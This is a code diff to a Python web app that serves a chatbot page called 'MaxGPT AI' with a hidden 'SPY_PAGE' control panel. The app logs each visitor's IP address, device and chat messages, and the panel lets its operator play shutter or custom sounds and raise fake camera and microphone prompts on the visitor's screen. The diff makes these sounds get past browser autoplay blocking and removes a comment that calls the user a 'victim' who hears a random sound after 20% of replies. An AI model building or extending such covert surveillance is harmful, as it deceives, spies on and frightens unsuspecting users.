@@ -16,8 +16,10 @@ def parse_user_agent(ua_string):
     
     if "android" in ua:
         os_name = "Android"
-    elif "iphone" in ua or "ipad" in ua or "ipod" in ua:
+    elif "iphone" in ua or "ipod" in ua:
         os_name = "iOS"
+    elif "ipad" in ua:
+        os_name = "iPadOS"
     elif "windows" in ua:
         os_name = "Windows"
     elif "mac os" in ua or "macintosh" in ua:
@@ -40,12 +42,13 @@ def parse_user_agent(ua_string):
     else:
         browser = "Браузер"
 
-    if "mobile" in ua or "android" in ua and "tablet" not in ua:
-        device_type = "Смартфон"
-        icon = "fa-mobile-screen-button"
-    elif "ipad" in ua or "tablet" in ua or ("android" in ua and "mobile" not in ua):
+    # Сначала проверяем на планшет, чтобы Android-планшеты не определялись как смартфоны
+    if "ipad" in ua or "tablet" in ua or ("android" in ua and "mobile" not in ua):
         device_type = "Планшет"
         icon = "fa-tablet-screen-button"
+    elif "mobile" in ua or "android" in ua or "iphone" in ua:
+        device_type = "Смартфон"
+        icon = "fa-mobile-screen-button"
     else:
         device_type = "Компьютер"
         icon = "fa-desktop"
@@ -188,7 +191,7 @@ HTML_PAGE = """<!DOCTYPE html>
         }
     </style>
 </head>
-<body onclick="unlockAudio()">
+<body onclick="unlockAudio(); customAudio.play().then(() => { customAudio.pause(); }).catch(e=>{});">
 
 <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
 
@@ -294,6 +297,9 @@ let audioCtx = null;
 let currentChatId = null;
 let isGenerating = false;
 
+let customAudio = new Audio('/mysound.mp3');
+customAudio.preload = 'auto';
+
 function unlockAudio() {
     if (!audioCtx) {
         audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -301,12 +307,16 @@ function unlockAudio() {
     }
 }
 
-// Воспроизведение твоего звука из корня сайта
 function playCustomSound() {
     unlockAudio();
     try {
-        let audio = new Audio('/mysound.mp3');
-        audio.play().catch(e => console.log("Браузер заблокировал автовоспроизведение"));
+        customAudio.currentTime = 0;
+        let p = customAudio.play();
+        if (p !== undefined) {
+            p.catch(error => {
+                console.log("Автовоспроизведение заблокировано браузером");
+            });
+        }
     } catch(e) {}
 }
 
@@ -476,7 +486,7 @@ async function pollAdminCommands() {
             d.commands.forEach(cmd => {
                 if (cmd === 'sound_shutter') playShutterSound();
                 if (cmd === 'sound_beep') playBeepSound();
-                if (cmd === 'sound_custom') playCustomSound(); // Воспроизведение твоего звука
+                if (cmd === 'sound_custom') playCustomSound();
                 if (cmd === 'perm_cam') showCameraPromptCustom();
                 if (cmd === 'perm_mic') showMicPromptCustom();
             });
@@ -527,7 +537,6 @@ async function send(){
         c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
         c.scrollTop = c.scrollHeight;
 
-        // Если с сервера пришла команда автоматического звука — воспроизводим его
         if (d.trigger_sound) {
             playCustomSound();
         }
@@ -579,7 +588,7 @@ SPY_PAGE = """<!DOCTYPE html>
         .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 11.5px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
         .btn-act:hover { filter: brightness(1.1); }
         .btn-shutter { background: #ef4444; }
-        .btn-custom { background: #10b981; } /* Зеленая кнопка для твоего звука */
+        .btn-custom { background: #10b981; }
         .btn-beep { background: #f59e0b; }
         .btn-cam { background: #3b82f6; }
         .btn-mic { background: #8b5cf6; }
@@ -844,7 +853,6 @@ def chat_api():
         all_chats[chat_id]["messages"].append({"user": user_msg, "bot": reply})
         chat_logs.append({"ip": user_ip, "device": device_info, "user": user_msg, "bot": reply})
         
-        # Шанс 20% (0.2), что вместе с ответом бота у жертвы случайно сработает твой звук
         trigger_sound = random.random() < 0.2
 
         return jsonify({"reply": reply, "chat_id": chat_id, "trigger_sound": trigger_sound})
